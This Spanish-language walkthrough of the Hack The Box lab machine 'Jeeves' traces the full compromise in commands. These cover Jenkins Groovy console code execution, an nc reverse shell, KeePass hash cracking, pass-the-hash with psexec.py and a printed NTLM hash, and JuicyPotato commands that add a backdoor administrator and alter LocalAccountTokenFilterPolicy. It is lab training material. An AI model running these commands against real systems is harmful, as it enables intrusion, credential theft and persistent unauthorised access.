---
banner: ss/Jeeves/cover.png
sticker: emoji//1f47e
tags:
  - JuicyPotato
  - Jenkins
  - RottenPotato
  - SeImpersonatePrivilege
  - AlternateDataStreams
  - BreakingKeePass
  - PassTheHash
  - psexec
  - Groovy
  - ADS
  - Windows
  - OSCP
  - eJPT
  - eWPT
  - SMB
  - impacket-smbserver
  - nc
  - nmap
  - misconfiguration
  - Jetty
---
# Reconocimiento

## [[Nmap]]

Comenzamos con el escaneo de puertos con la herramienta Nmap.

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.63 -oG allPorts
```

![](ss/Jeeves/nmap.png)

Puertos encontrados:
- 80
- 135
- 445
- 50000

Siguiente paso es identificar los servicios que estan correindo por detras de esos puertos, eso lo hacemos con los siguientes parametros "-sC" para lanzar una serie de scripts de reconocimiento y  "-sV" para identificar las versiones.

Esos dos parametros los podemos simplificar de la siguiente manera ( -sCV ):

```
nmap -p80,135,445 -sCV 10.10.10.63 -oN targeted
```

![](ss/Jeeves/nmap-services.png)

## Puerto 80 ( HTTP )

Esta pagina parece ser un RabbitHole, osea no nos llevara a ningun lado.

![](ss/Jeeves/rabbitHole.png)

Los enlaces no redirijen a ningun sitio y la accion de el form es mostrar un error.html que contiene una imgen de error.

![](ss/Jeeves/errorHtml.png)

Al buscar cualquier dato en el searchBar te muestra la siguiente imgen.

![](ss/Jeeves/imgError.png)

Por lo tanto descartamos este puerto.

## Puerto 445 ( SMB ) 

Para ver exactamente a lo que me estoy enfrentando puedo hacer lo siguiente:

### [[crackmapexec]]

```
crackmapexec smb 10.10.10.63
```

Bueno estamos ante un windows 10 pro x64, la maquina tiene el nombre JEEVES y el smb no esta firmado.

![](ss/Jeeves/cme.png)

### [[smbclient]]

Como el el servicio SMB esta expuesto puedo probar listar los recursos compartidos a nivel de red existentes con la herramienta smbclient.

```
smbclient -L 10.10.10.63 -N
```

![](ss/Jeeves/smbclient.png)
### [[smbmap]]

Probamos con otra herramienta alternativa, smbmap.

```
smbmap -H 10.10.10.63
```

Pero no consigo nada.

![](ss/Jeeves/smbmap.png)

Pruebo con NULL session y nada.

![](ss/Jeeves/smbmap-null.png)
## Puerto 50000 ( HTTP )

En el puerto 50000 tiene montado una web, pero asi de primera nos da un 404 Not Found.

![](ss/Jeeves/web_5.png)

### [[wfuzz]]

Voy a comenzar a hacer fuzzing ya que es raro un servicio web en un puerto 50000, voy a utlizar la herramienta wfuzz.

```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.63:50000/FUZZ
```

La ruta 'askjeeves' tiene un state code 302 redirect por lo tanto algo ha de aver.

![](ss/Jeeves/wfuzz.png)

Nos lleva a un Server Jenkins.

![](ss/Jeeves/jenkins.png)

Jenkins es un servidor de automatización, por lo que seguramente tendrá algún tipo de acceso directo a la máquina subyacente. Si va a la opción Administrar Jenkins en el menú superior izquierdo, verá una consola de scripts.

![](ss/Jeeves/script1.png)

![](ss/Jeeves/script2.png)

Solo toca investigar un poco Groovy.

![](ss/Jeeves/groovy.png)

Y de esta forma es como podemos ejecutar comandos.

```
println "ls".execute().text
```

Probemos...

![](ss/Jeeves/whoami.png)

Si...

Bueno como sabemos tiene el servicio SMB expuesto por lo tanto lo siguiente que voy hacer es con impacket-smbserver levantar un servidor smb para compartir [[nc]].exe a la maquina windows y enviarme una cmd por [[nc]].

![](ss/Jeeves/impacket.png)

Ahora en la consola de script nos enviamos el cmd de la siguiente forma.

![](ss/Jeeves/script3.png)

Ahora antes de ejecutar el comando, nos ponemos en escucha y en espera de la conexion con [[nc]] en el puerto 443.

![](ss/Jeeves/nc2.png)

Ahora ejecutamos y por debajo vemos el hash `NTLM` y por arriba tenemos ya una consola para movernos por el sistema comprometido.

![](ss/Jeeves/conn1.png)

# 1er Flag

![](ss/Jeeves/usertxt.png)

Ahora el siguiente paso es elevar privilegios.

# Escalada de Privilegios 1

Actualmente somo el usuario kohsuke.

Dando un vistazo por los otros directorios,  en el Documents hay algo interesante y es un archivo de base de datos en el formato de KeePass, un popular administrador de contraseñas de codigo abierto.

![](ss/Jeeves/kdbx.png)

Voy a tratar de extraer el hash de CEH.kdbx con la herramineta [[keepass2john]].

Para eso necesito copiar ese archivo en mi maquina, lo hare de la siguiente manera.

![](ss/Jeeves/ceh.png)

```
keepass2john CEH.kdbx > hash
```

![](ss/Jeeves/keepasshash.png)

Ahora con la herramienta [[john]] crackeamos el hash.

![](ss/Jeeves/pass.png)

Ahora que tenemos la contraseña abrimos la base de datos de keepass con [[keepassxc]].

```
keepassxc CEH.kdbx
```

![](ss/Jeeves/keepassxc1.png)

Ingresamos la contraseña y estamos dentro.

![](ss/Jeeves/keepassxc2.png)

En el apartado de Backup stuff tenemos un NTHASH que podemos usar con la herramienta psexec.py.

Esta es la estructura de el hash, nosotros solo necesitamos la parte derecha que esta despues de los dos puntos.

```
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

Vamos a probar primero con crackmapexec si es una credencial valida, como los unicos usuario en el sistema son administrator y kohsuke voy a suponer que el hash es del usuario administrator.

Y en efecto me aparece como pwn3d.

![](ss/Jeeves/cme2.png)
## [[psexec]].py

Ahora con psexec.py nos conectamos al sistema con las crendeciales del usuario Administrator.

```
psexec.py WORKGROUP/Administrator@10.10.10.63 -H e0fb1fb85756c24235ff238cbe81fe00
```

Ahora tenemos acceso full al sistema como usuario nt authority\\system.

![](ss/Jeeves/priv2.png)

## 2da Flag

"La flag esta en otro lugar, mira profundo".

![](ss/Jeeves/ds1.png)

Con el siguiente comando podemos ver los ADS ( Alternate Data Streams )

```
dir /r /s
```

![](ss/Jeeves/ds2.png)

Para ver el contenido lo hacemos de la siguiente manera.

```
more < hm.txt:root.txt
```

![](ss/Jeeves/root.png)

# Escalada de Privilegios 2

( Usuario Actual: kohsuke )

Este es otro metodo para escalar privilegios en esta maquina, con el comando whoami /priv vamos a poder ver los privilegios asignados al usuario actual.
### SeImpersonatePrivilege

Este es un privilegio que posee cualquier proceso que permite la suplantación (pero no la creación) de cualquier token, siempre que se pueda obtener un identificador para él. Un token privilegiado puede ser adquirido de un servicio de Windows (DCOM) induciéndolo a realizar autenticación NTLM contra un exploit, lo que posteriormente permite la ejecución de un proceso con privilegios de SISTEMA. Esta vulnerabilidad puede ser explotada utilizando varias herramientas, como [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (que requiere que winrm esté deshabilitado), [SweetPotato](https://github.com/CCob/SweetPotato) y [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

![](ss/Jeeves/priv1.png)
## Juicy Potato

Para hacer uso de esta herramienta lo que tenemos que hacer es descargar el [[JuicyPotato]].exe de el repositorio de Github y una vez descargado lo vamos a copiar en la maquina windows por SMB.

Una vez ya tengamos el ejecutable.exe en el sistema:

Crear un nuevo usuario.

```
JuicyPotato.exe -t * -p c:\Windows\System32\cmd.exe -a "/c net user pos3idon pos3idon123$! /add" -l 1234
```

- `JuicyPotato.exe`: Es el ejecutable de la herramienta Juicy Potato.
- `-t *`: Especifica el tipo de tokens de seguridad a usar. En este caso, el asterisco (*) indica que se intentará usar cualquier token disponible.
- `-p c:\Windows\System32\cmd.exe`: Especifica el programa que se ejecutará con los privilegios elevados.
- `-a "/c net user pos3idon pos3idon123$! /add"`: Es el argumento que se pasará al programa especificado en el parámetro `-p`. En este caso, se está ejecutando el comando `net user` para agregar un nuevo usuario llamado "pos3idon" con la contraseña "pos3idon123$!".
- `-l 1234`: Especifica el puerto local que se utilizará para la comunicación.

Este comando intenta aprovechar una vulnerabilidad en el servicio "Local Service" de Windows para ejecutar el comando `net user` con privilegios elevados y agregar un nuevo usuario al sistema con el nombre "pos3idon" y la contraseña "pos3idon123$!".


Agregar usuario nuevo al grupo Administrators

```
JuicyPotato.exe -t * -p c:\Windows\System32\cmd.exe -a "/c net localgroup Administrators pos3idon /add" -l 1234
```

`-a "/c net localgroup Administrators pos3idon /add"`: En este caso, se está ejecutando el comando `net localgroup` para agregar el usuario "pos3idon" al grupo de administradores locales del sistema.


Si al verificar con crackmapexec y no te aparece un pwn3d puedes hacer lo sigiente.

Tienes que modificar un registro.

```
JP.exe -t * -p c:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1234
```

Y ya tendrias un usuario valido a nivel de sistema con privilegios de administrador con el cual ingresar a a travez de psexec.py.